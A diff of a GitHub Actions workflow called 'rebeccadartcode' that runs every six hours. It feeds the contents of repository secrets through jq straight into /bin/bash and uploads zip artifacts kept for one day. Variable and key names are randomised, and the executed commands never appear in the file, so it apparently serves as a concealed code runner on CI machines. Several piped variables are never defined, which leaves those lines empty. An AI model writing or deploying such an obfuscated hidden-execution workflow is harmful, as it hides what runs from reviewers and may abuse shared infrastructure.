@@ -1,31 +1,27 @@
 name: rebeccadartcode
 on:
   workflow_dispatch:
-  schedule:
-    - cron: '51 2/6 * * *'
 
+  schedule:
+    - cron: '21 0,6,12,18 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: rebeccadartcode
         env:
-          rokn0: ${{ secrets.rokn0 }}
+          u20: ${{ secrets.u20 }}
         run: |
-          echo $rokn0 | jq -r .xkncd38 | /bin/bash
-          echo $iyqb7 | jq -r .ysdcp8 | /bin/bash
-          echo $fori3008 | jq -r .hwf41544 | /bin/bash
-          echo $kyrhw9 | jq -r .flyb597 | /bin/bash
-          echo $m629 | jq -r .zaag897 | /bin/bash
-          echo $nuk87 | jq -r .atvsi4440 | /bin/bash
-          echo $tog2208 | jq -r .le50021 | /bin/bash
-          echo $rbft3 | jq -r .xctm90694 | /bin/bash
-          echo $w1 | jq -r .xbdml24 | /bin/bash
-          echo $boy9 | jq -r .jhyr2612 | /bin/bash
-          echo $e6 | jq -r .uhut134 | /bin/bash
-          echo $w05 | jq -r .fos2 | /bin/bash
-          echo $ybxk0137 | jq -r .z080 | /bin/bash
-          echo $ifjo5 | jq -r .s8904 | /bin/bash
+          printf '%s' "$u20" | jq -r .bups2 | /bin/bash
+          printf '%s' "$s87" | jq -r .omjc05 | /bin/bash
+          printf '%s' "$jyob3" | jq -r .zofi060 | /bin/bash
+          echo $hpggr54684 | jq -r .azfg2 | /bin/bash
+          echo $omfkg3 | jq -r .jigkw0 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: WyOwB6y1
+          path: "*.zip"
+          retention-days: 1
